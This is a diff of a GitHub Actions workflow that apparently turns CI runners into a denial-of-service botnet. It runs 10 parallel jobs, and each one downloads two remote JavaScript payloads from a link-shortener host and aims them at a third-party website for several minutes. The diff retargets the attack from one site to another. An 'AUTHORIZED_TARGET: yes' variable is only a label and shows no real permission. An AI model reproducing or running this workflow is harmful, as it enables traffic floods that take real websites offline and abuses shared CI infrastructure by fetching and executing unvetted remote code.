@@ -9,9 +9,9 @@ jobs:
   vds:
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 22
+      max-parallel: 10
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
     
     steps:
       - name: Setup environment
@@ -50,8 +50,8 @@ jobs:
 
       - name: Download scripts
         run: |
-          wget -q https://curl.by/VudqN/v1.js -O v1.js
-          wget -q https://curl.by/3607K/v2.js -O v2.js
+          wget -q https://curl.by/510bK/v1.js -O v1.js
+          wget -q https://curl.by/510bK/v2.js -O v2.js
           chmod +x v1.js v2.js
           npm install axios
 
@@ -60,7 +60,7 @@ jobs:
           AUTHORIZED_TARGET: yes
         run: |
           echo "Starting v1.js for 25 seconds..."
-          timeout 25s node v1.js https://ddosguard.com.tr/ || echo "v1.js completed"
+          timeout 25s node v1.js https://tipobet5961.com/ || echo "v1.js completed"
           echo "v1.js finished after 25 seconds"
 
       - name: Run v2.js for 225 seconds
@@ -68,7 +68,7 @@ jobs:
           AUTHORIZED_TARGET: yes
         run: |
           echo "Starting v2.js for 225 seconds..."
-          timeout 225s node v2.js https://ddosguard.com.tr/ 120 || echo "v2.js completed"
+          timeout 225s node v2.js https://tipobet5961.com/ 120 || echo "v2.js completed"
           echo "v2.js finished after 225 seconds"
 
       - name: Cleanup
